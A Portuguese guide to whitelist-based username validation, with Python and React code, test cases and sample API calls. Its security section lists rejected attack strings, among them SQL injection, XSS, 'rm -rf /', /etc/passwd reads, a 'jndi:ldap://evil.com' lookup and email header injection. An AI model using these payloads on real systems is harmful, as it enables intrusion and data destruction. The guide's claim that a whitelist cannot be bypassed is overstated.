# Validação de Username - Lista Branca (Whitelist)

## Visão Geral

A função `validate_username()` implementa validação de entrada usando o princípio de **lista branca (whitelist)**, permitindo apenas caracteres explicitamente aprovados e rejeitando todos os outros.

## Especificação Técnica

### Expressão Regular (Regex)
```python
USERNAME_REGEX = re.compile(r'^[a-zA-Z0-9_]+$')
```

### Caracteres Permitidos
- **Letras minúsculas**: a-z
- **Letras maiúsculas**: A-Z
- **Números**: 0-9
- **Underscore**: _

### Restrições de Comprimento
- **Mínimo**: 3 caracteres
- **Máximo**: 30 caracteres

### Regras Adicionais

1. ✅ **Não pode começar com número**
   - ❌ `123user`
   - ✅ `user123`

2. ✅ **Não pode começar com underscore**
   - ❌ `_user`
   - ✅ `user_name`

3. ✅ **Não pode terminar com underscore**
   - ❌ `user_`
   - ✅ `user_name`

4. ✅ **Não pode conter underscores consecutivos**
   - ❌ `user__name`
   - ✅ `user_name`

## Proteções de Segurança

### ✓ SQL Injection
A lista branca bloqueia caracteres usados em SQL injection:

```
❌ admin' OR '1'='1
❌ admin'--
❌ admin'; DROP TABLE users;--
✅ admin
```

### ✓ XSS (Cross-Site Scripting)
Bloqueia tags HTML e JavaScript:

```
❌ <script>alert('xss')</script>
❌ javascript:alert(1)
❌ <img src=x onerror=alert(1)>
✅ user123
```

### ✓ Path Traversal
Impede navegação de diretórios:

```
❌ ../../../etc/passwd
❌ ..\..\windows\system32
❌ ../../admin
✅ admin
```

### ✓ Command Injection
Bloqueia caracteres de execução de comandos:

```
❌ user; rm -rf /
❌ user && cat /etc/passwd
❌ user | ls
✅ user_admin
```

### ✓ Template Injection
Previne injeção de templates:

```
❌ user{{7*7}}
❌ ${jndi:ldap://evil.com}
❌ {{config}}
✅ user_config
```

### ✓ LDAP Injection
Bloqueia caracteres especiais LDAP:

```
❌ user*
❌ user(uid=*)
❌ user)(|(password=*))
✅ user
```

### ✓ Email Header Injection
Impede injeção em headers de email:

```
❌ user\r\nBcc: attacker@evil.com
❌ user%0ABcc:attacker@evil.com
✅ user
```

## Exemplos de Uso

### Backend (Python/Flask)

```python
from src.routes.user import validate_username

# Validar username no registro
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    
    # Validar
    is_valid, error_message = validate_username(username)
    
    if not is_valid:
        return jsonify({'error': error_message}), 400
    
    # Prosseguir com registro...
```

### Frontend (JavaScript/React)

```javascript
// Validação client-side (mesma regex)
function validateUsername(username) {
  const USERNAME_REGEX = /^[a-zA-Z0-9_]+$/;
  const MIN_LENGTH = 3;
  const MAX_LENGTH = 30;
  
  if (!username) {
    return { valid: false, error: 'Username é obrigatório' };
  }
  
  username = username.trim();
  
  if (username.length < MIN_LENGTH || username.length > MAX_LENGTH) {
    return { 
      valid: false, 
      error: `Username deve ter entre ${MIN_LENGTH} e ${MAX_LENGTH} caracteres` 
    };
  }
  
  if (!USERNAME_REGEX.test(username)) {
    return { 
      valid: false, 
      error: 'Username contém caracteres não permitidos. Use apenas letras, números e underscore (_)' 
    };
  }
  
  if (/^[0-9_]/.test(username)) {
    return { 
      valid: false, 
      error: 'Username não pode começar com número ou underscore' 
    };
  }
  
  if (username.endsWith('_')) {
    return { 
      valid: false, 
      error: 'Username não pode terminar com underscore' 
    };
  }
  
  if (username.includes('__')) {
    return { 
      valid: false, 
      error: 'Username não pode conter underscores consecutivos' 
    };
  }
  
  return { valid: true, error: null };
}

// Uso em componente React
function RegistrationForm() {
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  
  const handleUsernameChange = (e) => {
    const value = e.target.value;
    setUsername(value);
    
    const validation = validateUsername(value);
    setError(validation.error || '');
  };
  
  return (
    <div>
      <input 
        type="text" 
        value={username}
        onChange={handleUsernameChange}
        placeholder="Username"
      />
      {error && <p className="error">{error}</p>}
    </div>
  );
}
```

## Casos de Teste

### ✅ Usernames Válidos

```
usuario123
joao_silva
Maria123
user_name_123
abc (mínimo 3 caracteres)
abcdefghijklmnopqrstuvwxyz1234 (máximo 30 caracteres)
User123_test
validUser_2024
admin
root
administrator
```

### ❌ Usernames Inválidos

| Username | Motivo da Rejeição |
|----------|-------------------|
| `user@123` | Contém @ |
| `user.name` | Contém . |
| `user-name` | Contém - |
| `user name` | Contém espaço |
| `user#123` | Contém # |
| `user$money` | Contém $ |
| `ab` | Muito curto (< 3 caracteres) |
| `a...31 chars` | Muito longo (> 30 caracteres) |
| `123user` | Começa com número |
| `_user` | Começa com underscore |
| `user_` | Termina com underscore |
| `user__name` | Underscores consecutivos |
| `josé` | Caractere acentuado |
| `user中文` | Caracteres unicode |

## Testes

Execute o arquivo de testes para verificar todos os cenários:

```bash
cd c:\Users\gabrielrodrigues\Codes\site-ia\evento-backend
python tests\test_username_validation.py
```

### Saída Esperada

```
╔==========================================================╗
║          TESTES DE VALIDAÇÃO DE USERNAME                ║
╚==========================================================╝

==============================================================
TESTANDO USERNAMES VÁLIDOS
==============================================================
✓ PASS: 'usuario123'
✓ PASS: 'joao_silva'
✓ PASS: 'Maria123'
...

==============================================================
TESTANDO USERNAMES INVÁLIDOS
==============================================================
✓ PASS: 'user@123'
      Razão: contém @
      Erro retornado: Username contém caracteres não permitidos...
...

==============================================================
TESTANDO CENÁRIOS DE SEGURANÇA
==============================================================
✓ PASS: username 'admin' simples - VÁLIDO
✓ PASS: SQL injection clássico - INVÁLIDO
...
```

## Integração com API

### Request de Registro

```bash
# Username válido
curl -X POST http://localhost:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "usuario_teste",
    "email": "teste@exemplo.com",
    "password": "senha123"
  }'

# Resposta sucesso (201)
{
  "message": "Usuário registrado com sucesso",
  "user": {
    "id": 1,
    "username": "usuario_teste",
    "email": "teste@exemplo.com"
  }
}
```

```bash
# Username inválido
curl -X POST http://localhost:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "user@123!",
    "email": "teste@exemplo.com",
    "password": "senha123"
  }'

# Resposta erro (400)
{
  "error": "Username contém caracteres não permitidos. Use apenas letras, números e underscore (_)"
}
```

## Boas Práticas

### 1. Validação em Múltiplas Camadas
- ✅ Validação client-side (UX)
- ✅ Validação server-side (Segurança)
- ✅ Validação no banco de dados (constraints)

### 2. Mensagens de Erro Claras
```python
# ❌ Ruim
"Invalid input"

# ✅ Bom
"Username contém caracteres não permitidos. Use apenas letras, números e underscore (_)"
```

### 3. Normalização de Entrada
```python
# Remover espaços em branco
username = username.strip()
```

### 4. Log de Tentativas Suspeitas
```python
if not is_valid:
    logger.warning(f"Tentativa de registro com username inválido: {username}")
```

## Comparação: Whitelist vs Blacklist

### ❌ Abordagem Blacklist (NÃO RECOMENDADA)

```python
# Tenta bloquear caracteres perigosos
BLACKLIST = ['<', '>', '"', "'", ';', '--', '/*', '*/', '&', '|']

def validate_blacklist(username):
    for char in BLACKLIST:
        if char in username:
            return False
    return True

# Problemas:
# - Lista incompleta (sempre há novos vetores de ataque)
# - Fácil de contornar com encoding
# - Difícil de manter
```

### ✅ Abordagem Whitelist (RECOMENDADA)

```python
# Permite apenas caracteres seguros
USERNAME_REGEX = re.compile(r'^[a-zA-Z0-9_]+$')

def validate_whitelist(username):
    return bool(USERNAME_REGEX.match(username))

# Vantagens:
# - Seguro por padrão
# - Simples de implementar
# - Fácil de entender e auditar
# - Não há como contornar
```

## Referências de Segurança

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Top 10 - Injection](https://owasp.org/www-project-top-ten/)

## Conclusão

A validação de username usando lista branca (whitelist) é uma camada essencial de segurança que:

✅ **Previne** múltiplos tipos de ataques de injeção  
✅ **Simplifica** a lógica de validação  
✅ **Garante** que apenas caracteres seguros sejam aceitos  
✅ **Melhora** a experiência do usuário com mensagens claras  
✅ **Facilita** a manutenção e auditoria do código  

**Regra de Ouro**: Nunca confie em dados fornecidos pelo usuário. Sempre valide e sanitize.
